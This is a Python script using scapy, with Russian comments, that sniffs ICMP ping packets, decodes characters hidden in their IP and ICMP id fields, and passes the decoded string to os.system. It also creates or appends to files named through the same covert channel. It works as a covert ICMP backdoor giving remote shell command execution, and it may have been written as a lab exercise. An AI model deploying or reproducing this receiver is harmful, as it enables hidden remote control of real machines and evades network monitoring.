from scapy.all import *
import os
import re

dictionary = {'01':'A','02':'B','03':'C','04':'D','05':'E','06':'F','07':'G','08':'H','09':'I','10':'J','11':'K','12':'L','13':'M','14':'N','15':'O','16':'P','17':'Q','18':'R','19':'S','20':'T','21':'U','22':'V','23':'W','24':'X','25':'Y','26':'Z','27':'a','28':'b','29':'c','30':'d','31':'e','32':'f','33':'g','34':'h','35':'i','36':'j','37':'k','38':'l','39':'m','40':'n','41':'o','42':'p','43':'q','44':'r','45':'s','46':'t','47':'u','48':'v','49':'w','50':'x','51':'y','52':'z','53':'1','54':'2','55':'3','56':'4','57':'5','58':'6','59':'7','60':'8','61':'9','62':' ','63':'"','64':'-','65':'.','66':':','67':',','68':'(','69':')','70':'/'}
def decoder(pocket): 
    
    m = 0
    n = []
    s = ''
    while(m<len(pocket)):
        
       if(m == len(pocket)-1):
            
           break
       if(m%2==0):
           p = pocket[m]+pocket[m+1]
           n.append(p)
           m = m+1
       else:
           m = m+1
           continue
    for i in n:
        if(i == '00'):
            break
        s+=dictionary.get(i)
    return s

packets = sniff(filter = "icmp", count = 100,timeout = 15)
s = []

for pkt in packets:
  
    if pkt[ICMP].type != 8:
        continue
    if ((pkt[IP].id == 1) and (pkt[ICMP].id==0)):
        c = 1
        continue
    if ((pkt[IP].id == 2) and (pkt[ICMP].id==0)):
        c = 2
        continue
    if ((pkt[IP].id == 3) and (pkt[ICMP].id==0)):
        c = 3
        continue
    if((len(str(pkt[IP].id))<4)):
        ip = '0'+str(pkt[IP].id) 
    else:
        ip = str(pkt[IP].id)     
    if(len(str(pkt[ICMP].id))<4):
        icmp = '0'+str(pkt[ICMP].id)
    else:
        icmp = str(pkt[ICMP].id)
    
    s += ip + icmp
#передаем команду в cmd
if(c == 1):
    command = decoder(s)
    print(decoder(s))
    os.system(command)
#создаем файл
if(c == 2):
    filename = decoder(s)
    print(filename)
    result = re.sub(r'{}', filename, 'cd.>{}')
    print(result)
    os.system(result)
#дописываем текст в файл
if(c == 3):
    filename = decoder(s)
    print(filename)
    try:
        with open(filename,"a") as file_handler:
            file_handler.write("Hello world")
    except IOError:
        print("An IOError has occurred!")





    
